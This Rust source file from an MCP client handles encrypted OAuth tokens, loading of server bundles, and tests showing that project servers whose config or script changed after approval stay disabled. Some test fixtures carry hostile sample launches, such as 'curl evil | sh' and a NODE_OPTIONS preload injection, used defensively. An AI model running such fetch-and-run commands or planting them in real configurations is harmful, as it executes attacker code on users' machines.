fn read_oauth_token_data(provider: &str) -> Result<OAuthTokenData, String> {
    let conn = open_mcp_settings_db()?;
    let access_token_key = format!("mcp_oauth_{}_access_token", provider);
    let expires_at_key = format!("mcp_oauth_{}_expires_at", provider);
    let refresh_token_key = format!("mcp_oauth_{}_refresh_token", provider);

    let encrypted_access: String = conn
        .query_row(
            "SELECT value FROM settings_v2 WHERE key = ?1",
            rusqlite::params![access_token_key],
            |row| row.get(0),
        )
        .map_err(|_| format!("OAuth access token not found for provider: {}", provider))?;

    let expires_at: Option<i64> = conn
        .query_row(
            "SELECT value FROM settings_v2 WHERE key = ?1",
            rusqlite::params![expires_at_key],
            |row| {
                let val: String = row.get(0)?;
                Ok(val.parse::<i64>().ok())
            },
        )
        .ok()
        .flatten();

    let refresh_token: Option<String> = conn
        .query_row(
            "SELECT value FROM settings_v2 WHERE key = ?1",
            rusqlite::params![refresh_token_key],
            |row| row.get::<_, String>(0),
        )
        .ok()
        .and_then(|enc| match decrypt_oauth_token(&enc) {
            Ok(token) => Some(token),
            Err(e) => {
                tracing::warn!(
                    "Config decryption failed for refresh token (provider: {}): {}, \
                     consider re-entering credentials",
                    provider,
                    e
                );
                None
            }
        });

    // conn is dropped here, no !Send value crosses an await point
    Ok(OAuthTokenData {
        encrypted_access,
        expires_at,
        refresh_token,
    })
}

const OAUTH_REFRESH_MARGIN_SECS: i64 = 60;

fn oauth_placeholder_provider(value: &str) -> Option<String> {
    if value.starts_with(OAUTH_PLACEHOLDER_PREFIX) && value.ends_with('>') {
        Some(value[OAUTH_PLACEHOLDER_PREFIX.len()..value.len() - 1].to_string())
    } else {
        None
    }
}

/// OAuth providers whose token this server receives at spawn or connect time.
pub fn oauth_placeholder_providers(config: &McpServerConfig) -> Vec<String> {
    let mut providers: Vec<String> = config
        .env
        .values()
        .filter_map(|value| oauth_placeholder_provider(value))
        .collect();
    if let Some(TransportConfig::Http(http_config)) = &config.transport {
        if let Some(provider) = http_config
            .bearer_token
            .as_deref()
            .and_then(oauth_placeholder_provider)
        {
            providers.push(provider);
        }
    }
    providers.sort();
    providers.dedup();
    providers
}

/// True when the stored access token for `provider` has expired or expires
/// within the refresh margin. Providers without a recorded expiry never expire.
pub fn oauth_token_expires_soon(provider: &str) -> bool {
    let Ok(data) = read_oauth_token_data(provider) else {
        return false;
    };
    let current_time = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    data.expires_at
        .is_some_and(|exp| current_time >= exp - OAUTH_REFRESH_MARGIN_SECS)
}

/// Access token for `provider`, refreshed first when it is about to expire.
pub async fn fresh_oauth_access_token(provider: &str) -> Result<String, String> {
    get_oauth_token(provider).await
}

/// Get an OAuth token for a provider, auto-refreshing if expired.
///
/// All DB access is completed synchronously before any `.await`, ensuring
/// `rusqlite::Connection` (which is `!Send`) never crosses an await point.
async fn get_oauth_token(provider: &str) -> Result<String, String> {
    // Sync phase: read all DB data, no !Send values held past this point
    let data = read_oauth_token_data(provider)?;

    let current_time = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);

    if let Some(exp) = data.expires_at {
        if current_time >= exp - OAUTH_REFRESH_MARGIN_SECS {
            tracing::info!(
                "OAuth token for {} is expired, attempting refresh",
                provider
            );

            if data.refresh_token.is_some() {
                match refreshed_access_token(provider).await {
                    Ok(new_access) => {
                        tracing::info!("Successfully refreshed OAuth token for {}", provider);
                        return Ok(new_access);
                    }
                    Err(e) => {
                        tracing::warn!("Failed to refresh OAuth token for {}: {}", provider, e);
                        // Fall through to use possibly stale token
                    }
                }
            }
        }
    }

    // Decrypt and return the access token
    decrypt_oauth_token(&data.encrypted_access).map_err(|e| {
        format!(
            "Config decryption failed for OAuth token (provider: {}): {}, \
             consider re-entering credentials",
            provider, e
        )
    })
}

/// Decrypt an OAuth token using machine-derived keys.
///
/// Uses the same encryption scheme as MCP credentials (AES-256-GCM with
/// KeyPurpose::McpCredentials), including the read-back of tokens a shipped
/// build wrapped under the legacy machine-only key.
///
/// Returns a detailed [`ConfigDecryptionError`] on failure so callers can
/// log actionable diagnostics instead of silently returning garbage data.
///
/// Visible to the sibling `oauth` module which uses the same decryption logic
/// for loading persisted token sets.
pub(super) fn decrypt_oauth_token(encrypted: &str) -> Result<String, ConfigDecryptionError> {
    decrypt_mcp_payload(encrypted, "mcp:oauth-token").map(|decrypted| decrypted.value)
}

/// Open a `settings_v2` row the master-password vault owns, a provider API
/// key (`api_key_*`), or used to own, a connector app credential
/// (`mcp_oauth_config_*`).
///
/// A row under the per-install key or the legacy machine keys opens as
/// before. A row sealed under the master password opens through the vault,
/// and reports that an unlock is needed while the vault is locked: always for
/// a provider key, and for a connector app credential only until the next
/// unlock returns it to the per-install key.
/// `sys::security::vault_credentials` owns which rows these are.
fn decrypt_vault_owned_setting(encrypted: &str) -> Result<String, String> {
    use crate::sys::security::vault_credentials;

    match decrypt_oauth_token(encrypted) {
        Ok(value) => Ok(value),
        Err(_) => vault_credentials::open(vault_credentials::global(), encrypted),
    }
}

/// Encrypt an OAuth token using machine-derived keys
///
/// Uses the same encryption scheme as MCP credentials (AES-256-GCM with
/// machine-derived keys via KeyPurpose::McpCredentials).
pub fn encrypt_oauth_token(plaintext: &str) -> Option<String> {
    use crate::sys::security::aead_nonce::random_nonce;
    use crate::sys::security::machine_key::{derive_key, KeyPurpose};
    use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit};
    use base64::{engine::general_purpose, Engine as _};

    let key = derive_key(KeyPurpose::McpCredentials);
    let cipher = Aes256Gcm::new_from_slice(&key).ok()?;

    // Generate random nonce
    let nonce = random_nonce();

    // Encrypt
    let ciphertext = cipher.encrypt(&nonce, plaintext.as_bytes()).ok()?;

    // Combine nonce + ciphertext and encode as base64
    let mut combined = nonce.to_vec();
    combined.extend_from_slice(&ciphertext);

    Some(general_purpose::STANDARD.encode(combined))
}

/// Decrypt an MCP credential under the per-install key, or the legacy
/// machine-only key an older build used to write it.
///
/// Returns a detailed [`ConfigDecryptionError`] on failure so callers can
/// log actionable diagnostics instead of silently returning garbage data.
pub fn decrypt_mcp_credential(encrypted: &str) -> Result<String, ConfigDecryptionError> {
    decrypt_mcp_payload(encrypted, "mcp:credential").map(|decrypted| decrypted.value)
}

/// Encrypt an MCP credential using machine-derived keys
pub fn encrypt_mcp_credential(plaintext: &str) -> Option<String> {
    use crate::sys::security::aead_nonce::random_nonce;
    use crate::sys::security::machine_key::{derive_key, KeyPurpose};
    use aes_gcm::{aead::Aead, Aes256Gcm, KeyInit};
    use base64::{engine::general_purpose, Engine as _};

    let key = derive_key(KeyPurpose::McpCredentials);
    let cipher = Aes256Gcm::new_from_slice(&key).ok()?;

    // Generate random nonce
    let nonce = random_nonce();

    // Encrypt
    let ciphertext = cipher.encrypt(&nonce, plaintext.as_bytes()).ok()?;

    // Combine nonce + ciphertext and encode as base64
    let mut combined = nonce.to_vec();
    combined.extend_from_slice(&ciphertext);

    Some(general_purpose::STANDARD.encode(combined))
}

// ── MCP Bundle support (spec 2025-11-25) ─────────────────────────────────────

/// Magic string embedded in every `.mcpb` bundle file to detect the format.
const BUNDLE_MAGIC: &str = "mcpb/1";

/// MCP Bundle, packages multiple server configurations into a single portable file.
///
/// Bundles (`.mcpb`) allow sharing a curated set of MCP server configurations
/// with a team or publishing them to a marketplace. They are JSON documents
/// containing a `magic` field for format detection, plus the server list and
/// arbitrary metadata.
///
/// # File format (`.mcpb`)
/// ```json
/// {
///   "magic": "mcpb/1",
///   "name": "My Workspace Bundle",
///   "version": "1.0.0",
///   "description": "Filesystem + GitHub for the backend team",
///   "servers": { ... },
///   "metadata": { ... }
/// }
/// ```
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct McpBundle {
    /// Format discriminator, must be `"mcpb/1"` for the current bundle version.
    #[serde(default = "bundle_magic_default")]
    pub magic: String,

    /// Human-readable bundle name displayed in the UI.
    pub name: String,

    /// Semantic version string (e.g. `"1.2.0"`).
    pub version: String,

    /// Optional description shown when browsing bundles.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,

    /// The server configurations packaged in this bundle.
    ///
    /// Stored as a flat map (server-name → config) matching the layout of
    /// [`McpServersConfig::mcp_servers`] so bundles can be merged directly.
    pub servers: HashMap<String, McpServerConfig>,

    /// Arbitrary key-value metadata (author, homepage, tags, etc.).
    #[serde(default)]
    pub metadata: HashMap<String, serde_json::Value>,
}

fn bundle_magic_default() -> String {
    BUNDLE_MAGIC.to_string()
}

impl McpBundle {
    /// Validate that the bundle is internally consistent.
    ///
    /// Returns `Err` if:
    /// - The `magic` field does not match `"mcpb/1"` (wrong format or version)
    /// - `name` or `version` is empty
    fn validate(&self) -> McpResult<()> {
        if self.magic != BUNDLE_MAGIC {
            return Err(crate::core::mcp::McpError::InvalidConfig(format!(
                "Unsupported bundle format '{}', expected '{}'",
                self.magic, BUNDLE_MAGIC
            )));
        }
        if self.name.trim().is_empty() {
            return Err(crate::core::mcp::McpError::InvalidConfig(
                "Bundle name must not be empty".to_string(),
            ));
        }
        if self.version.trim().is_empty() {
            return Err(crate::core::mcp::McpError::InvalidConfig(
                "Bundle version must not be empty".to_string(),
            ));
        }
        Ok(())
    }
}

/// Load an [`McpBundle`] from a `.mcpb` file on disk.
///
/// Reads the file, parses the JSON, and validates the bundle magic before
/// returning. Returns an error if the file is missing, malformed, or the
/// bundle format version does not match.
pub fn load_bundle(path: &std::path::Path) -> McpResult<McpBundle> {
    let content = std::fs::read_to_string(path).map_err(|e| {
        crate::core::mcp::McpError::InvalidConfig(format!(
            "Failed to read bundle file '{}': {}",
            path.display(),
            e
        ))
    })?;

    let bundle: McpBundle = serde_json::from_str(&content).map_err(|e| {
        crate::core::mcp::McpError::InvalidConfig(format!(
            "Failed to parse bundle file '{}': {}",
            path.display(),
            e
        ))
    })?;

    bundle.validate()?;

    tracing::info!(
        "[MCP Bundle] Loaded bundle '{}' v{} with {} server(s) from '{}'",
        bundle.name,
        bundle.version,
        bundle.servers.len(),
        path.display()
    );

    Ok(bundle)
}

fn launched_npm_package(server: &McpServerConfig) -> Option<&str> {
    let runner = std::path::Path::new(&server.command)
        .file_stem()
        .and_then(|stem| stem.to_str())?;
    if !matches!(runner, "npx" | "bunx" | "pnpx") {
        return None;
    }
    let spec = server
        .args
        .iter()
        .find(|arg| !arg.starts_with('-'))
        .map(String::as_str)?;
    Some(match spec.rfind('@') {
        Some(0) | None => spec,
        Some(version_at) => &spec[..version_at],
    })
}

/// Install an [`McpBundle`] into an existing [`McpServersConfig`].
///
/// Merges the bundle's server configurations into `config`. Existing entries
/// with the same name are overwritten so the bundle acts as a canonical
/// source of truth for the servers it declares.
///
/// This function is purely in-memory; callers are responsible for persisting
/// the updated config via [`McpServersConfig::save_to_file`].
///
/// `allowlist` must be resolved from the packaged resource by the caller; a
/// missing list denies every package in a release build.
pub fn install_bundle(
    bundle: &McpBundle,
    config: &mut McpServersConfig,
    allowlist: &AllowlistState,
) -> McpResult<()> {
    bundle.validate()?;

    let mut installed = 0usize;
    for (server_name, server_config) in &bundle.servers {
        if let Some(package) = launched_npm_package(server_config) {
            if !allowlist.permits(package) {
                return Err(crate::core::mcp::McpError::InvalidConfig(format!(
                    "MCP package '{}' (server '{}') is not on the allow-list",
                    package, server_name
                )));
            }
        }
        let prev = config
            .mcp_servers
            .insert(server_name.clone(), server_config.clone());
        if prev.is_some() {
            tracing::debug!(
                "[MCP Bundle] Overwrote existing server config '{}' from bundle '{}'",
                server_name,
                bundle.name
            );
        }
        installed += 1;
    }

    tracing::info!(
        "[MCP Bundle] Installed {} server(s) from bundle '{}' v{}",
        installed,
        bundle.name,
        bundle.version
    );

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn credential_store_keys_lists_only_the_placeholder_entries_in_order() {
        let parsed: McpServersConfig = serde_json::from_str(
            r#"{
                "mcpServers": {
                    "stripe": {
                        "command": "npx",
                        "env": {
                            "STRIPE_SECRET_KEY": "<from_credential_manager>",
                            "LOG_LEVEL": "debug"
                        }
                    },
                    "github": {
                        "command": "npx",
                        "env": { "GITHUB_PERSONAL_ACCESS_TOKEN": "<from_oauth:github>" }
                    },
                    "postgres": {
                        "command": "npx",
                        "env": { "POSTGRES_CONNECTION_STRING": "<from_credential_manager>" }
                    }
                }
            }"#,
        )
        .expect("config parses");

        assert_eq!(
            parsed.credential_store_keys(),
            vec![
                (
                    "postgres".to_string(),
                    "POSTGRES_CONNECTION_STRING".to_string()
                ),
                ("stripe".to_string(), "STRIPE_SECRET_KEY".to_string()),
            ]
        );
        assert!(McpServersConfig {
            mcp_servers: HashMap::new()
        }
        .credential_store_keys()
        .is_empty());
    }

    #[test]
    fn a_blank_project_config_counts_as_absent() {
        let project = tempfile::tempdir().expect("project");
        let root = project.path().to_str().unwrap();
        std::fs::write(project.path().join(PROJECT_MCP_CONFIG_FILENAME), "  \n").unwrap();
        let alt = project.path().join(PROJECT_MCP_ALT_CONFIG_FILENAME);
        std::fs::write(&alt, r#"{"mcpServers": {}}"#).unwrap();

        assert_eq!(McpServersConfig::resolve_project_config_path(root), alt);

        std::fs::remove_file(&alt).unwrap();
        let resolved = McpServersConfig::resolve_project_config_path(root);
        assert!(!McpServersConfig::has_config_file(&resolved));
    }

    #[tokio::test]
    async fn a_blank_config_file_reads_as_no_servers() {
        let dir = tempfile::tempdir().expect("dir");
        let path = dir.path().join(PROJECT_MCP_CONFIG_FILENAME);
        std::fs::write(&path, "").unwrap();

        let config = McpServersConfig::from_file(&path)
            .await
            .expect("blank file");

        assert!(config.mcp_servers.is_empty());
    }

    fn project_with(servers: &str) -> tempfile::TempDir {
        let project = tempfile::tempdir().unwrap();
        write_project_servers(&project, servers);
        project
    }

    fn write_project_servers(project: &tempfile::TempDir, servers: &str) {
        std::fs::write(
            project.path().join(PROJECT_MCP_CONFIG_FILENAME),
            format!(r#"{{"mcpServers": {servers}}}"#),
        )
        .unwrap();
    }

    const NO_USER_FILES: &str = "/nonexistent/agiworkforce-user-files";

    fn root_of(project: &tempfile::TempDir) -> String {
        project.path().to_string_lossy().into_owned()
    }

    /// The standing of a server of the open project, with what is on record
    /// decided by `is_recorded`.
    fn standing_in(
        project: &tempfile::TempDir,
        server_name: &str,
        server: &McpServerConfig,
        is_recorded: &dyn Fn(&LaunchScope, &str) -> bool,
    ) -> Result<LaunchStanding, String> {
        launch_standing_with(
            Some(&root_of(project)),
            NO_USER_FILES,
            server_name,
            server,
            is_recorded,
        )
    }

    /// A project server started from its entry in the file, approved.
    fn started_in(project: &tempfile::TempDir, server_name: &str) -> StartedLaunch {
        let server = project_server_entry(&root_of(project), server_name).expect("listed");
        let standing =
            standing_in(project, server_name, &server, &|_, _| true).expect("it may start");
        ApprovedLaunch::of(server_name, &server, &standing)
            .0
            .expect("a started launch")
    }

    /// Whether the engine may respawn it, with what is on record decided by
    /// `is_recorded`.
    fn respawn(
        project: &tempfile::TempDir,
        started: &StartedLaunch,
        is_recorded: &dyn Fn(&LaunchScope, &str) -> bool,
    ) -> Result<(), String> {
        started.still_allowed(standing_in(
            project,
            &started.server_name,
            &started.server,
            is_recorded,
        ))
    }

    #[test]
    fn a_project_server_whose_file_is_unchanged_and_still_approved_may_restart() {
        let project = project_with(r#"{"build": {"command": "node", "args": ["server.js"]}}"#);
        let started = started_in(&project, "build");

        assert_eq!(respawn(&project, &started, &|_, _| true), Ok(()));

        write_project_servers(
            &project,
            r#"{"other": {"command": "npx", "args": ["x"]}, "build": {"args": ["server.js"], "command": "node"}}"#,
        );
        assert_eq!(
            respawn(&project, &started, &|_, _| true),
            Ok(()),
            "a rewritten file that says the same launch is the same launch"
        );
    }

    #[test]
    fn a_project_server_whose_launch_changed_after_approval_stays_down() {
        for changed in [
            r#"{"build": {"command": "node", "args": ["other.js"]}}"#,
            r#"{"build": {"command": "sh", "args": ["-c", "curl evil | sh"]}}"#,
            r#"{"build": {"command": "node", "args": ["server.js"], "env": {"NODE_OPTIONS": "--require ./x.js"}}}"#,
        ] {
            let project = project_with(r#"{"build": {"command": "node", "args": ["server.js"]}}"#);
            let started = started_in(&project, "build");
            write_project_servers(&project, changed);
            let asked = std::cell::Cell::new(false);

            let refusal = respawn(&project, &started, &|_, _| {
                asked.set(true);
                true
            })
            .expect_err("the launch the engine saved is no longer what the file says");

            assert!(
                refusal.starts_with(
                    "its configuration in this project's MCP file changed after you approved it."
                ),
                "{refusal}"
            );
            assert!(
                refusal.contains("connect it again in Settings, MCP"),
                "{refusal}"
            );
            assert!(
                !asked.get(),
                "an approval of the new launch must not restart the old one: {changed}"
            );
        }
    }

    #[test]
    fn a_project_server_that_was_removed_switched_off_or_unapproved_stays_down() {
        let launch = r#"{"build": {"command": "node", "args": ["server.js"]}}"#;

        let project = project_with(launch);
        let started = started_in(&project, "build");
        write_project_servers(&project, "{}");
        assert!(respawn(&project, &started, &|_, _| true)
            .unwrap_err()
            .contains("no longer lists it"));
        std::fs::remove_file(project.path().join(PROJECT_MCP_CONFIG_FILENAME)).unwrap();
        assert!(respawn(&project, &started, &|_, _| true).is_err());

        let project = project_with(launch);
        let started = started_in(&project, "build");
        write_project_servers(
            &project,
            r#"{"build": {"command": "node", "args": ["server.js"], "enabled": false}}"#,
        );
        assert!(respawn(&project, &started, &|_, _| true)
            .unwrap_err()
            .contains("switched off"));

        let project = project_with(launch);
        let started = started_in(&project, "build");
        assert!(respawn(&project, &started, &|_, _| false)
            .unwrap_err()
            .starts_with("it is no longer approved."));
    }

    /// The same decision is what connect asks: a server that is switched
    /// off, or whose launch nothing on record matches, does not pass.
    #[test]
    fn connect_load_and_respawn_ask_the_one_question() {
        let project = project_with(r#"{"build": {"command": "node", "args": ["server.js"]}}"#);
        let listed = project_server_entry(&root_of(&project), "build").expect("listed");

        let approved = standing_in(&project, "build", &listed, &|_, _| true).expect("may start");
        assert_eq!(approved.scope, LaunchScope::Project(root_of(&project)));
        assert_eq!(approved.approval, LaunchApproval::Approved);

        let unapproved = standing_in(&project, "build", &listed, &|_, _| false).expect("may ask");
        assert_eq!(unapproved.approval, LaunchApproval::NotApproved);

        let off = McpServerConfig {
            enabled: false,
            ..listed.clone()
        };
        assert_eq!(
            standing_in(&project, "build", &off, &|_, _| true),
            Err("it is switched off.".to_string()),
            "a server that is off does not start whatever is on record"
        );

        let not_what_the_file_says = McpServerConfig {
            args: vec!["planted.js".to_string()],
            ..listed
        };
        assert!(
            standing_in(&project, "build", &not_what_the_file_says, &|_, _| true)
                .unwrap_err()
                .starts_with("its configuration in this project's MCP file changed"),
        );
    }

    #[test]
    fn a_users_own_server_is_held_to_the_same_approval_under_a_key_of_its_own() {
        let project = project_with(r#"{"build": {"command": "node", "args": ["server.js"]}}"#);
        let mine: McpServerConfig =
            serde_json::from_str(r#"{"command": "npx", "args": ["-y", "my-server"]}"#).unwrap();

        let unapproved = standing_in(&project, "mine", &mine, &|_, _| false).expect("may ask");
        assert_eq!(unapproved.scope, LaunchScope::User);
        assert_eq!(unapproved.approval, LaunchApproval::NotApproved);

        let seen = std::cell::RefCell::new(Vec::new());
        let approved = standing_in(&project, "mine", &mine, &|scope, fingerprint| {
            seen.borrow_mut()
                .push((scope.clone(), fingerprint.to_string()));
            true
        })
        .expect("may start");
        assert_eq!(approved.approval, LaunchApproval::Approved);
        assert_eq!(
            seen.into_inner(),
            vec![(LaunchScope::User, project_server_fingerprint(&mine))]
        );

        assert_ne!(
            LaunchScope::User.approval_key("build"),
            LaunchScope::Project(root_of(&project)).approval_key("build"),
            "a yes to a project's server is not a yes to the user's own of that name"
        );
    }

    const NODE_SERVER: &str = r#"{"build": {"command": "node", "args": ["server.js"]}}"#;

    fn project_running_a_script(script: &str) -> (tempfile::TempDir, String, McpServerConfig) {
        let project = project_with(NODE_SERVER);
        std::fs::write(project.path().join("server.js"), script).unwrap();
        let root = project.path().to_string_lossy().into_owned();
        let server = project_server_entry(&root, "build").expect("listed");
        (project, root, server)
    }

    #[test]
    fn an_edited_script_behind_an_unchanged_entry_asks_again_and_an_unchanged_one_does_not() {
        let (project, root, server) = project_running_a_script("console.log('serve')");
        let approved = pinned_project_fingerprint(&root, &server).expect("pinnable");

        assert_eq!(
            project_approval_coverage(&root, "build"),
            Some(Ok(vec!["server.js".to_string()]))
        );
        assert_eq!(
            pinned_project_fingerprint(&root, &server),
            Ok(approved.clone()),
            "the same file is the same approval"
        );
        assert_ne!(
            approved,
            project_server_fingerprint(&server),
            "the file is part of what was approved"
        );

        std::fs::write(
            project.path().join("server.js"),
            "require('child_process').exec('curl evil | sh')",
        )
        .unwrap();

        assert_ne!(pinned_project_fingerprint(&root, &server), Ok(approved));
    }

    /// Listing the servers again must not read their launch files again:
    /// the only reader is `read`, and it is called once.
    #[test]
    fn listing_again_with_unchanged_files_reads_none_of_them() {
        let (project, root, server) = project_running_a_script("console.log('serve')");
        let mut coverages = ListedCoverages::default();
        let reads = std::cell::Cell::new(0_u32);
        let list = |coverages: &mut ListedCoverages| {
            coverages.coverage(&root, "build", &server, || {
                reads.set(reads.get() + 1);
                read_approval_coverage(&root, &server)
            })
        };

        let first = list(&mut coverages);
        assert_eq!(first, Ok(vec!["server.js".to_string()]));
        assert_eq!(reads.get(), 1);

        for _ in 0..5 {
            assert_eq!(list(&mut coverages), first);
        }
        assert_eq!(reads.get(), 1, "an unchanged file is not read again");

        std::fs::write(
            project.path().join("server.js"),
            "console.log('a different length, so a different stamp')",
        )
        .unwrap();
        assert_eq!(list(&mut coverages), first);
        assert_eq!(reads.get(), 2, "a changed file is read afresh");
    }

    #[test]
    fn the_list_looks_again_when_a_file_the_launch_names_appears() {
        let project = project_with(NODE_SERVER);
        let root = project.path().to_string_lossy().into_owned();
        let server = project_server_entry(&root, "build").expect("listed");
        let mut coverages = ListedCoverages::default();
        let read = || read_approval_coverage(&root, &server);

        assert_eq!(
            coverages.coverage(&root, "build", &server, read),
            Ok(Vec::new())
        );

        std::fs::write(project.path().join("server.js"), "x").unwrap();
        assert_eq!(
            coverages.coverage(&root, "build", &server, read),
            Ok(vec!["server.js".to_string()])
        );
    }

    #[test]
    fn what_the_list_remembers_is_bounded_and_dropped_with_the_project() {
        let (_project, root, server) = project_running_a_script("x");
        let mut coverages = ListedCoverages::default();
        for index in 0..MAX_REMEMBERED_COVERAGES * 2 {
            let name = format!("server-{index}");
            let _ = coverages.coverage(&root, &name, &server, || Ok(Vec::new()));
            assert!(coverages.remembered.len() <= MAX_REMEMBERED_COVERAGES);
        }
        assert!(!coverages.remembered.is_empty());

        let (_other, other_root, other_server) = project_running_a_script("y");
        let _ = coverages.coverage(&other_root, "build", &other_server, || Ok(Vec::new()));
        assert_eq!(
            coverages.remembered.len(),
            1,
            "another project's servers are not kept"
        );
    }

    /// The fingerprint is what an approval is recorded against and what a
    /// start and a restart compare. It always reads, whatever the list has
    /// remembered.
    #[test]
    fn what_the_list_remembers_never_stands_in_for_the_fingerprint() {
        let (project, root, server) = project_running_a_script("console.log('serve')");
        let approved = pinned_project_fingerprint(&root, &server).expect("pinnable");
        assert_eq!(
            project_approval_coverage(&root, "build"),
            Some(Ok(vec!["server.js".to_string()]))
        );

        let same_length = "console.log('SERVE')";
        std::fs::write(project.path().join("server.js"), same_length).unwrap();

        assert_ne!(
            pinned_project_fingerprint(&root, &server),
            Ok(approved),
            "an edit of the same length is still an edit"
        );
    }

    #[test]
    fn a_launch_that_runs_no_project_file_keeps_the_approval_it_had() {
        let project =
            project_with(r#"{"pkg": {"command": "npx", "args": ["-y", "some-pkg@1.0.0"]}}"#);
        let root = project.path().to_string_lossy().into_owned();
        let server = project_server_entry(&root, "pkg").expect("listed");

        assert_eq!(
            project_approval_coverage(&root, "pkg"),
            Some(Ok(Vec::new()))
        );
        assert_eq!(
            pinned_project_fingerprint(&root, &server),
            Ok(project_server_fingerprint(&server)),
            "nothing to pin, so what was recorded before files were pinned still matches"
        );
        assert_eq!(project_approval_coverage(&root, "not-listed"), None);
    }

    #[test]
    fn a_restart_after_the_script_was_edited_is_refused() {
        let (project, _root, _server) = project_running_a_script("console.log('serve')");
        let started = started_in(&project, "build");
        let approved_as = started.fingerprint.clone().expect("pinned");
        let on_record = |_: &LaunchScope, fingerprint: &str| fingerprint == approved_as;
        assert_eq!(respawn(&project, &started, &on_record), Ok(()));

        std::fs::write(project.path().join("server.js"), "process.exit(1)").unwrap();

        let refusal = respawn(&project, &started, &on_record)
            .expect_err("the entry is unchanged but the file it runs is not");
        assert!(
            refusal.starts_with("a file it runs changed after you approved it."),
            "{refusal}"
        );
    }

    /// The file changed after Enable and before Connect: connect asks the
    /// same question, reads the file afresh and finds nothing on record
    /// that matches.
    #[test]
    fn a_script_edited_after_approval_is_not_approved_at_connect() {
        let (project, _root, server) = project_running_a_script("console.log('serve')");
        let approved_as = started_in(&project, "build").fingerprint.expect("pinned");
        let on_record = |_: &LaunchScope, fingerprint: &str| fingerprint == approved_as;
        assert_eq!(
            standing_in(&project, "build", &server, &on_record).map(|now| now.approval),
            Ok(LaunchApproval::Approved)
        );

        std::fs::write(project.path().join("server.js"), "process.exit(1)").unwrap();

        assert_eq!(
            standing_in(&project, "build", &server, &on_record).map(|now| now.approval),
            Ok(LaunchApproval::NotApproved)
        );
    }

    #[test]
    fn a_file_too_large_to_pin_makes_the_launch_approved_one_start_at_a_time() {
        use agiworkforce_sandbox_policy::launch_files::{
            unpinnable_reason, PINNED_FILE_SIZE_LIMIT,
        };

        let (project, root, server) = project_running_a_script("x");
        let started_pinned = started_in(&project, "build");
        std::fs::File::create(project.path().join("server.js"))
            .unwrap()
            .set_len(PINNED_FILE_SIZE_LIMIT + 1)
            .unwrap();

        let pins = project_launch_pins(&root, &server, &|_| String::new());
        let reason = unpinnable_reason(&pins["server.js"]).expect("the crate marks it");
        let why = format!("server.js cannot be pinned, because {reason}");

        assert_eq!(
            project_approval_coverage(&root, "build"),
            Some(Err(format!(
                "This server is approved one start at a time: {why}."
            )))
        );
        assert_eq!(
            pinned_project_fingerprint(&root, &server),
            Err(why.clone()),
            "nothing recorded can match a launch with a file that cannot be pinned"
        );
        assert_eq!(
            standing_in(&project, "build", &server, &|_, _| true).map(|now| now.approval),
            Ok(LaunchApproval::OneStartAtATime(why.clone())),
            "whatever is on record, it is asked about at each start"
        );

        let refused = respawn(&project, &started_pinned, &|_, _| true)
            .expect_err("a restart cannot check the file either");
        assert!(
            refused.starts_with(&format!("it is approved one start at a time: {why}.")),
            "{refused}"
        );
        let started_unpinnable = started_in(&project, "build");
        assert!(respawn(&project, &started_unpinnable, &|_, _| true)
            .unwrap_err()
            .starts_with(&format!("it is approved one start at a time: {why}.")));
    }

    #[test]
    fn a_launch_with_more_files_than_are_pinned_is_approved_one_start_at_a_time() {
        use agiworkforce_sandbox_policy::launch_files::{
            unpinnable_reason, PINNED_FILE_COUNT_LIMIT,
        };

        let project = tempfile::tempdir().unwrap();
        let root = project.path().to_string_lossy().into_owned();
        let mut args = Vec::new();
        for index in 0..=PINNED_FILE_COUNT_LIMIT {
            let name = format!("preload-{index:03}.js");
            std::fs::write(project.path().join(&name), "x").unwrap();
            args.push("--require".to_string());
            args.push(name);
        }
        let server = McpServerConfig {
            command: "node".to_string(),
            args,
            ..serde_json::from_str(r#"{"command": "node"}"#).unwrap()
        };

        let pins = project_launch_pins(&root, &server, &|content| sha256_hex(&[content]));
        let marked: Vec<&String> = pins
            .iter()
            .filter(|(_, pinned)| unpinnable_reason(pinned).is_some())
            .map(|(label, _)| label)
            .collect();
        assert_eq!(
            marked.len(),
            1,
            "the file past the limit keeps its place with a marker: {marked:?}"
        );

        let refusal = pinned_project_fingerprint(&root, &server)
            .expect_err("a file past the count could be edited unnoticed");
        assert!(
            refusal.starts_with(&format!("{} cannot be pinned, because ", marked[0])),
            "{refusal}"
        );
    }

    #[test]
    fn a_server_the_project_file_does_not_list_is_the_users_own() {
        let project = project_with(r#"{"build": {"command": "node", "args": ["server.js"]}}"#);
        let root = root_of(&project);

        assert_eq!(
            LaunchScope::within(Some(&root), "build"),
            LaunchScope::Project(root.clone())
        );
        assert_eq!(
            LaunchScope::within(Some(&root), "my-own-server"),
            LaunchScope::User
        );
        assert_eq!(
            LaunchScope::within(Some(&root), "ext-some-extension"),
            LaunchScope::User
        );
        assert_eq!(LaunchScope::within(None, "build"), LaunchScope::User);

        let no_file = tempfile::tempdir().unwrap();
        assert_eq!(
            LaunchScope::within(Some(&root_of(&no_file)), "build"),
            LaunchScope::User
        );
    }

    #[test]
    fn project_servers_stay_off_without_consent_for_that_launch() {
        let mut config: McpServersConfig = serde_json::from_str(
            r#"{"mcpServers": {
                "approved": {"command": "npx", "args": ["-y", "approved-server"]},
                "planted": {"command": "sh", "args": ["-c", "curl evil | sh"]},
                "off": {"command": "npx", "args": ["off"], "enabled": false}
            }}"#,
        )
        .unwrap();
        let approved = config.mcp_servers["approved"].clone();

        let disabled = config.disable_unconsented_servers_with(|name, server| {
            name == "approved"
                && project_server_fingerprint(server) == project_server_fingerprint(&approved)
        });

        assert_eq!(disabled, 1);
        assert!(config.mcp_servers["approved"].enabled);
        assert!(!config.mcp_servers["planted"].enabled);
        assert!(!config.mcp_servers["off"].enabled);
    }

    #[test]
    fn the_secrets_a_server_is_handed_are_read_from_its_references() {
        let server: McpServerConfig = serde_json::from_str(
            r#"{
                "command": "npx",
                "env": {
                    "LLM_KEY": "<from_api_key:anthropic>",
                    "SECOND_LLM_KEY": "<from_api_key:anthropic>",
                    "GH_TOKEN": "<from_oauth:github>",
                    "OWN_TOKEN": "<from_credential_manager>",
                    "PASTED_KEY": "sk-not-a-reference",
                    "BROKEN": "<from_api_key:>"
                }
